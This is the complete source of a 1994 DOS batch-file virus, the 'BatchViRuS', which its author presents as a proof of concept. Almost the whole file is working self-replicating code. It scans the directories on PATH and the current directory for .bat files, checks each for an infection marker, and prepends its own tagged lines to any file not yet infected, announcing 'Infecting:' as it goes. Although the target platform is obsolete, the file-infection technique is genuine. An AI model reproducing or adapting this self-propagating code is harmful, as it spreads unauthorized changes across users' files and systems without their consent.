@echo off>nul.ViRuS
   rem ViRuS The BatchViRuS by Dirk van Deun 1994
   rem ViRuS May be copied freely (On your own machine !)
   rem ViRuS Programmed to prove that it's possible
   rem ViRuS (and to show off skill in writing batchfiles)
   rem ViRuS If you have no disk cache, you're not interested ;-)
   rem ViRuS E-mail hw41652@vub.ac.be
    
   rem ViRuS Known bug: interpretation of variables may make lines too long
   rem ViRuS for DOS and let characters drop off: unpredictable behaviour
    
   if "%0==" echo --------------------------------------->con.ViRuS
   if "%0==" echo |   Hi ! I am the nice BatchViRuS !   |
   if "%0==" echo --------------------------------------->con.ViRuS
   if "%0==" goto ViRuS_OLDBAT
   if "%1=="/ViRuS_MULTIPLY goto ViRuS_multiply
   if "%1=="/ViRuS_PARSEPATH goto ViRuS_parsepath
   if "%1=="/ViRuS_FINDSELF goto ViRuS_findself
   if "%VOFF%=="T goto ViRuS_OLDBAT
    
   set ViRuSname=%0
   if not exist %0.bat command /e:10000 /c %0 /ViRuS_FINDSELF %path%
   if not exist %0.bat call xViRuSx
   if not exist %0.bat del xViRuSx.bat
   if not exist %ViRuSname%.bat set ViRuSname=
   if "%ViRuSname%==" goto ViRuS_OLDBAT
    
   rem ViRuS if batch is started with name.BAT, virus will not become active
   rem ViRuS it was a bug, now it's a feature ! (also notice the voff variable)
   rem ViRuS also if batch was only in an append /x:on path (chance=minimal)
   rem ViRuS or if environment is too small to contain %ViRuSname% !
    
   if "%VPATH%==" set VPATH=%PATH%>nul.ViRuS
   rem (if environment cannot hold VPATH, ViRuS will function partially)
   command /e:10000 /c %0 /ViRuS_PARSEPATH %VPATH%
   call xViRuSx
   del xViRuSx.bat
   if "%VPATH%==" set VPATH=.>nul.ViRuS
   set ViRuSname=
   goto ViRuS_OLDBAT
    
   :ViRuS_findself
   if "%2==" echo.>xViRuSx.bat
   if "%2==" exit>nul.ViRuS
   if exist %2\%ViRuSname%.bat echo set ViRuSname=%2\%ViRuSname%>xViRuSx.bat
   if exist %2\%ViRuSname%.bat exit
   if exist %2%ViRuSname%.bat echo set ViRuSname=%2%ViRuSname%>xViRuSx.bat
   if exist %2%ViRuSname%.bat exit
   shift>nul.ViRuS
   goto ViRuS_findself
    
   :ViRuS_parsepath
   for %%a in (%2\*.bat;%2*.bat) do command /e:10000 /c %ViRuSname% /ViRuS_MULTIPLY %%a
   for %%a in (%2\*.bat;%2*.bat) do goto ViRuS_new_vpath
   shift>nul.ViRuS
   if not "%2==" goto ViRuS_parsepath
   if not "%1==". for %%a in (.\*.bat) do command /e:10000 /c %ViRuSname% /ViRuS_MULTIPLY %%a
   :ViRuS_new_vpath
   set VPATH=%3>nul.ViRuS
   :ViRuS_loop
   shift>nul.ViRuS
   if "%3==" echo set VPATH=%VPATH%>xViRuSx.bat
   if "%3==" exit>nul.ViRuS
   set VPATH=%VPATH%;%3>nul.ViRuS
   goto ViRuS_loop
    
   :ViRuS_multiply
   echo Checking: %2>con.ViRuS
   find "SeT IchBin=%%0" <%2>xViRuSx.bat
   call xViRuSx
   del xViRuSx.bat
   if "%IchBin%=="xViRuSx exit
   find "ViRuS" <%ViRuSname%.bat>xViRuSx.bat
   type %2>>xViRuSx.bat
   copy xViRuSx.bat %2>nul
   del xViRuSx.bat
   echo Infecting: %2>con.ViRuS
   exit>nul.ViRuS
    
   rem data for the first find in ViRuS_multiply
   SeT IchBin=%0>nul.ViRuS
    
   :ViRuS_OLDBAT
   echo on>nul.ViRuS
   echo This is the dummy original batch
